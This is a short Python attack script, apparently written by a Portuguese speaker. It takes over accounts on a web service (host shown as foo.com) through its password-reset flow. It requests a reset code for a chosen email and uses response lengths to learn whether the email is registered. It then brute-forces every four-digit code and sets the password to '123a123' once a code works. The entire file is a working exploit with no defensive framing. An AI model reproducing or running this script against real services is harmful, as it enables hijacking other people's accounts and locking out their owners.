import time
import eventlet
import requests
import urllib3

urllib3.disable_warnings()  # para o proxy

#  vars
url = "https://foo.com/web/basic/getPassword"
email = input("Plz, Insira o email: ")
headers = {'User-Agent': 'firefox'}
myobj = {"type": "forgot", "email": email, "language": "pt"}

# send 1° request, to generate the code
print("Starting first request, may take a time...")
with eventlet.Timeout(30):  # espera até 30 segundos
    r = requests.post("https://foo.com/web/basic/sendEmailCode", verify=False,
                      json=myobj, headers=headers)

if len(r.text) == 50:
    print("The email is not in use!")
    exit(-2)

if len(r.text) != 36:
    print(r.text)
    print("Error in first request!")
    exit(-3)

#  bruteforcing

seconds = time.time()
local_time = time.localtime(seconds)

print("Done. Starting bruteforce at: ", local_time.tm_hour, "h and ", local_time.tm_min,
      "min.\nExpected time < 10 min.")

for codigo in range(0, 10001):
    myobj = {"password": "123a123", "confirm_password": "123a123", "language": "pt", "email": email,
             "code": ('%04d' % codigo)}
    r = requests.post(url, verify=False, json=myobj, headers=headers)
    string = r.text
    if codigo % 100 == 0:  # mostrar somente a cada 100
        print('%04d' % codigo)
    if len(string) == 36:  # worked
        print("Oooyeahhhh, the code " + str(codigo) + " worked!\nPassword changed\nLeaving now!")
        exit(0)
    codigo += 1
# fail
print("Error in the bruteforce bruh!\nIs the email valid, u sure?\n"
      "Time not ended? (more than 10min, so the code expire)\nDunno xD\n")
exit(-2)
